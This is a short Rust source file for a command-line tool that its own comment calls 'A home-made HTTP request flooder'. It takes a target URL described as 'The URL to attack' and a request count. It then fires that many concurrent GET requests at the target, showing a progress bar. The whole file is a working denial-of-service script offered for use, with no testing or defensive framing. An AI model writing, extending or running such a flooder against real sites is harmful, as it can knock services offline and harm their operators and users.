use clap::Parser;
use reqwest::{Client, Response, Error};
use tokio::{task::JoinHandle};
use indicatif::{ProgressBar, ProgressStyle, ProgressIterator};


/// A home-made HTTP request flooder
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The URL to attack
    #[arg(short, long)]
    url: String,

    /// Number of requests to send to the target
    #[arg(short, long)]
    count: u64,
}

async fn join(handles: Vec<JoinHandle<Result<Response, Error>>>) {
    let pb = ProgressBar::new(handles.len() as u64);
    pb.set_style(
        ProgressStyle::with_template(
            "{spinner:.green} [{elapsed_precise}] [{bar:40.cyan/blue}] ({pos}/{len}, ETA {eta})",
        )
        .unwrap(),
    );

    for handle in handles.into_iter().progress_with(pb) {
        handle.await;
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let client = Client::new();
    let mut handles = vec![];

    for _ in 1..args.count + 1 {
        handles.push(tokio::spawn(client.get(&args.url).send()));
    }

    join(handles).await;

    Ok(())
}
